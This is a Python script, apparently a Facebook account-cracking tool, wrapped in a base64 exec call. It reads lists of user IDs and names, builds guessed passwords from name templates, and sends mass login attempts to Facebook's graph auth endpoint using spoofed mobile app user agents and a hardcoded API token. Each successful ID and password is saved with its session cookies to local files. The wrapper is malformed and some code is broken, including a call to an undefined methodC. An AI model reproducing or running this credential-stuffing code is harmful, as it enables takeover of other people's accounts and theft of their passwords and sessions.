import base64
exec(base64.b64decode(b'#__________________[ IMPORT ]__________________#
import os,zlib
from os import system as osRUB
from os import system as cmd
os.system('clear')
print(f'\x1b[38;5;46m[\x1b[38;5;160m◆\x1b[38;5;46m] INSTALL MODEL WAITING.... ') 
try:
    import requests,certifi,rich, pycurl 
except:
    os.system("pip install requests certifi rich pycurl")
    import requests,certifi,rich,pycurl
    
try:
    import concurrent.futures
except ImportError:
    print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING FUTURES ')
    os.system('pip install futures')
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')

try:
    import rich
except:
    os.system("pip install rich")
    import rich

from rich.progress import track

def looood(MACHINE):
    for i in track(range(500),description=MACHINE):
        time.sleep(0.01)
        
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as Habib
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
#__________________[ LOOP ]__________________#
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
loop,ok,cp,user = 0,[],[],[]
cok,plist = [],[]

#__________ADNAN_UA_ZONE____________#
build = random.choice(['OPD2302.','SP1A.','TP2A.','SP1A.','SP1A.','TP1A.','TP1A.','SP1A.','TP1A.','RKQ1.','TP1A.','TP1A.','RP1A.','RP1A.','RKQ1.','TQ3A.','TD2A.','TD4A.','TQ3A.','TP1A.','TP1A.','SP2A.','SD2A.','SQ3A.','RD2A.','RQ3A.','RP1A.','QD4A.','QQ3A.','QP1A.','PQ3B.','PD2A.','PPR2.','PPR1.','OPM8.','OPR6.'])
realme = random.choice(['RMX3930','RMX6703','RMX8344','RMX9941','RMX4876','RMX4709','RMX0432','RMX7073','RMX5796','RMX8529','RMX3142','RMX5579','RMX0664','RMX6912','RMX1242','RMX5158','RMX5376','RMX1542','RMX0978','RMX9174'])
fbks = random.choice(['orca-Andorid','com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
FBPKG2 = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
viviom = random.choice(['V2057A','I2208','V2228','V1922A','V1916A','V1930A','vivo Y55A','vivo Y55A','I2018','vivo 1707','V2168A','V2228','V1836A','V1930A','V2057A','vivo 1707','V2121A','V2121A','V2147','V1824A'])
company = random.choice(['archos','sony','samsung','vivo','oppo','realme','redmi','xiaomi','galaxy','itel'])
sony = random.choice(['XQCT62-B','xperia 1 iv','SM-A137F','V2043','CPH2363','RMX3511','M1908C3JH','SM-A135F','itel S661L'])
newmod = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
model = random.choice(['SM-A047F','SM-A047M','SM-A127M','SM-A127F','SM-A135F','SM-A135U','SM-A135M','SM-A135N','SM-A137F','SM-A135U1','SM-A136U','SM-A136W','SM-A136B','SM-A136S','SM-A136M','SM-A136U1','SM-S136DL','SM-A145MB','SM-A145FB','SM-A225M','SM-A225F','SC-56B','SM-A235N','SM-A235F','SM-A235M','SM-A236U','SM-A236B','SM-A236M','SM-A236E','SM-A236U1','SM-A2360','SM-A236V','SM-S236DL','SM-A233C','SC-56C','SCG18','SM-A245F','SM-A245M','SM-A245N','SM-A325M','SM-A325F','SM-A325N','SM-A326K','SM-A326BR','SM-A326B','SM-A326U','SM-A326W','SCG08','SM-S326DL','SM-A326U1','SM-A336B','SM-A336E','SM-A336M','SM-A3360','SM-A336N','SM-A346N','SM-A3460','SM-A346E','SM-A346B','SM-A346M','SM-A426N','SM-S426DL','SM-A426U1','SM-A426U','SM-A515F','SM-A515U','SM-A515W','SM-A515U1','SM-S515DL','SM-A516N','SM-A516B','SM-A5160','SM-A516V','SCG07','SC-54A','SM-A516U','SM-A516U1','SM-A525F','SM-A525M','SM-A526U','SC-53B','SM-A526W','SM-A526B','SM-A5260','SM-A526U1','SM-A528B','SM-A528N'])
samsung_models = random.choice(['samsung s22 s','galaxy s7','galaxy s8','galaxy s9','galaxy s10','galaxy note 5','galaxy note 8','galaxy note 9','galaxy a5','galaxy a7','galaxy j5','s22 ultra'])

#━━━━━━━━━━━[ FILE-UA] ━━━━━━━━━━━ 

def S1():
	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','en_BD','en_IN','en_AF'])
	application_version = str(random.randint(111,444))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,33))
	ver = str(random.randrange(30,443))
	app_version = str(random.randint(111,444))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,33))
	app_ver_code=str(random.randint(000000000,999999999))
	application_version_code=str(random.randint(111111111,999999999))
	fbap = random.choice(['414.0.0.30.113','398.0.0.21.105','274.0.0.22.117','316.4.0.15.120','385.0.0.32.114','415.0.0.34.107','414.0.0.30.113','357.0.0.13.112','415.0.0.34.107','408.1.0.16.113','412.0.0.22.115','240.0.0.38.121','414.0.0.30.113','241.0.0.43.15'])
	fbcr = "random.choice(['o2 - de', 'Verizon - us', 'Vodafone - uk','null','en_GB','en_US','en_PK','IND airtel','Nepal Telecom'])}"
	s = "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	e = '[FBAN/FB4A;FBAV/22.0.0.52.200;FBBV/65289853;FBDM/{density=2.75,width=720,height=1612};FBLC/en_US;FBRV/65289853;FBCR/Bkash;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M1803E6I;FBSV/4.0.0;FBOP/19;FBCA/arm64-v8a:null;]'
	ua = s + e
	#print(ua)
	return ua 

	
def S2():
	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','en_BD','en_IN','en_AF'])
	application_version = str(random.randint(111,444))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,33))
	ver = str(random.randrange(30,443))
	app_version = str(random.randint(111,444))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,33))
	app_ver_code=str(random.randint(000000000,999999999))
	application_version_code=str(random.randint(111111111,999999999))
	fbap = random.choice(['414.0.0.30.113','398.0.0.21.105','274.0.0.22.117','316.4.0.15.120','385.0.0.32.114','415.0.0.34.107','414.0.0.30.113','357.0.0.13.112','415.0.0.34.107','408.1.0.16.113','412.0.0.22.115','240.0.0.38.121','414.0.0.30.113','241.0.0.43.15'])
	fbcr = "random.choice(['o2 - de', 'Verizon - us', 'Vodafone - uk','null','en_GB','en_US','en_PK','IND airtel','Nepal Telecom'])}"
	s = "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	e = '[FBAN/FB4A;FBAV/440.0.0.31.105;FBBV/534746235;FBDM/{density=2.8125,width=1080,height=2385};FBLC/zh_HK;FBRV/536947487;FBCR/Grameenphone;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/XQ-CQ72;FBSV/13;FBOP/19;FBCA/arm64-v8a:;]' 
	ua = s + e
	#print(ua)
	return ua 

#__________________[ SYS ]__________________#
os.system('xdg-open https://www.facebook.com/MR.ADNAN.404')
sys.stdout.write('\x1b]2; ADNAN-XD\x07')
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
#__________________[ COLOUR ]__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';M = '\x1b[38;5;205m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';G = '\x1b[38;5;48m'
orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\x1b[38;5;160m"
green="\x1b[38;5;46m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"
my_color = [white,blue,green];warna = random.choice(my_color) 

#__________________[ LINEX ]__________________#
def clear():os.system('clear');print(logo)
looood("")
def linex():print(f'{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
#__________________[ LOGO. ..]__________________#
logo =f"""
{green}▞▀▖▛▀▖▙ ▌▞▀▖▙ ▌  ▞▀▖▌ ▌▙▗▌▛▀▘▛▀▖
{green}▙▄▌▌ ▌▌▌▌▙▄▌▌▌▌  ▙▄▌▙▄▌▌▘▌▙▄▖▌ ▌
{green}▌ ▌▌ ▌▌▝▌▌ ▌▌▝▌  ▌ ▌▌ ▌▌ ▌▌  ▌ ▌
{green}▘ ▘▀▀ ▘ ▘▘ ▘▘ ▘  ▘ ▘▘ ▘▘ ▘▀▀▘▀▀  {white}V{green}/{white}4.8
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{rad}[{white}◆{rad}] {green}FACEBOOK  {white}➣{green}  ADNAN WASIF SHAKIL
{rad}[{white}◆{rad}] {green}TOOLTYPE  {white}➣{green}  FREE{white}{rad}┼{faltu}{rad}FILE & RANDOM{pvt}{green}{rad}┼ 
{rad}[{white}◆{rad}] {green}GITHUB    {white}➣{white}   ({gren}ADNAN-570{white})
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#__________________[ RESULT ]__________________#
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print(f'\r{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
        print(f'{rad}[{white}◆{rad}] {green}THE PROCESS HAS BEEN COMPLETED...')
        print(f'{rad}[{white}◆{rad}] {green}TOTAL OK {white}➣{green} %s' % str(len(oks)))
        print(f'{rad}[{white}◆{rad}] {green}TOTAL CP {white}➣{rad} %s' % str(len(cps)))
        print(f'\r{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
        input(f"{rad}[{white}◆{rad}] {green}PRESS ENTER TO BACK MENU ")
        exit()
#__________________[ MENU ]__________________#
def menu():   
    clear()
    print(f'{rad}[{white}1{rad}] {green}START FILE CLONE')
    print(f'{rad}[{white}2{rad}] {green}START RANDOM CLONE  {rad}({white}COMMING SOON{rad})')
    print(f'{rad}[{white}3{rad}] {green}JOIN WHATSAPP GROUPE')
    print(f'{rad}[{white}4{rad}] {green}CONTAC TOOL ADMIN')
    print(f'{rad}[{white}0{rad}] {gren}EXIT MENU  ')
    linex()
    select = input(f'{rad}[{white}◆{rad}] {green}CHOICE OPTION {white}➣{green} ')
    if select =='1':
        _file_()
    elif select =='2':
    	_file_()
    elif select =='3':
        os.system('xdg-open https://chat.whatsapp.com/Bd8RQc6VoKxLOO9ljc5Raj');menu()
    elif select =='4':
        os.system('xdg-open https://www.facebook.com/MR.ADNAN.404');menu()
    elif select =='0':
        exit(f'{green}[{rad}+{green}] SUCCESFULLY EXIT DONE ')
    else:
        print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
        time.sleep(2)
        menu()

def _file_():
    global methods
    clear()
    print(f'{rad}[{white}◆{rad}] {green}METHOD - 1')
    print(f'{rad}[{white}◆{rad}] {green}METHOD - 2')
    linex()
    option = input(f'{rad}[{white}◆{rad}] {green} CHOICE OPTION {rad}➣{green} ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id)
    elif option =='0':
        _file_()
    else:
      print(f'{green}[{rad}+{green}] VALID OPTION')
      time.sleep(2)
      _file_()

class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        print(f'{rad}[{white}◆{rad}] {green}EXAMPLE {rad}➣{green} /sdcard/adnan.txt');linex()
        self.file = input(f'{rad}[{white}◆{rad}]{green} FILE NAME {rad}➣{green} ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f'{green}[{rad}+{green}] OPPS FILE NOT FOUND ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print(f'{green}[{rad}+{green}] TRY AGAIN ...')
            time.sleep(2)
            main_crack().crack(id)
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{rad}[{green}ADNAN-M1{rad}]{white}-{rad}[{gren}{loop}{rad}]{white}-{rad}[{green}OK{rad}]{white}-{rad}[{green}{len(oks)}{rad}] ") 
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:       
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': S1(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"{ckkk}"
                    print(f"\r\r{rad}[{green}ADNAN-OK{rad}] {green}{sid} {rad}-{green} {ps} ")
                    ##print(f'\r\r{green}=[💉]={white} {cookie}''\n')
                    open('/sdcard/ADNAN-M1-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     ##print(f"\r\r{black}[ADNAN-CP] • {sid} - {ps} ")
                     open('/sdcard/ADNAN--CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps) 
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{rad}[{gren}ADNAN-M2{rad}]{white}-{rad}[{green}{loop}{rad}]{white}-{rad}[{green}OK/CP{rad}]{white}-{rad}[{green}{len(oks)}/{len(cps)}{rad}] ") 
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': S2(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]); SMILEb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"{ckkk}"
                    print(f"\r\r{rad}[{green}ADNAN-OK{rad}] {green}{sid} {rad}-{green} {ps} ")
                    ##print(f'\r\r{green}=[💉]={white} {cookie}''\n') 
                    open('/sdcard/ADNAN-M2-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    ##print(f"\r\r{black}[ADNAN-CP] • {sid} - {ps} ")
                    open('/sdcard/ADNAN-CP.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
            self.methodC(sid, name, ps) 
            
#__________________[ PASSWORD ]__________________#
    def pasw(self):       
            pw = []
            clear()
            print(f'{rad}[{white}◆{rad}] {green}NOOT LAST LIMIT 20 PASSWORD');linex()
            sl = int(input(f'{rad}[{white}◆{rad}] {green}PASSWORD LIMIT {rad}➣{green} '))
